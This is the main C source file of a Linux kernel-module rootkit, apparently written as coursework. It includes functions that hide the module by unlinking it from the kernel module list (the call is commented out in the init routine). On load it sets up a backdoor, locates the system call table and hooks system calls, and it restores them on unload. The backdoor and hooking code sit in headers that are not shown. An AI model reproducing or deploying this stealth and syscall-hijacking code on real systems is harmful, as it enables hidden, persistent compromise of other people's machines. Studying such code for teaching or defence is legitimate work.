#include <linux/init.h>
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/list.h>
#include <linux/syscalls.h>
#include <linux/cred.h>

#include "rootkit_main.h"
#include "modify_syscalls.h"
#include "backdoor.h"

MODULE_LICENSE("GPL");
MODULE_AUTHOR("Finn_Adam_Charlie");
MODULE_DESCRIPTION("CW Rootkit");
MODULE_VERSION("0.0.1");

void **sys_call_table;
struct list_head *module_list;
struct sysinfo *info;

void hide(void)
{
    module_list = THIS_MODULE->list.prev;
    list_del(&THIS_MODULE->list);
}

void unhide(void)
{
    list_add(&THIS_MODULE->list, module_list);
}

static int __init lkm_example_init(void) {
    //Don't hide the kernel for now
    //hide();
    printk(KERN_INFO "Hello, World!\n");

    backdoor_init();

    sys_call_table = find_syscall_table();
    pr_info("Found sys_call_table at %p\n", sys_call_table);

    update_sys_calls(sys_call_table);

    return 0;
}

static void __exit lkm_example_exit(void) {
    printk(KERN_INFO "Goodbye, World!\n");

    revert_to_original(sys_call_table);
}



module_init(lkm_example_init);
module_exit(lkm_example_exit);
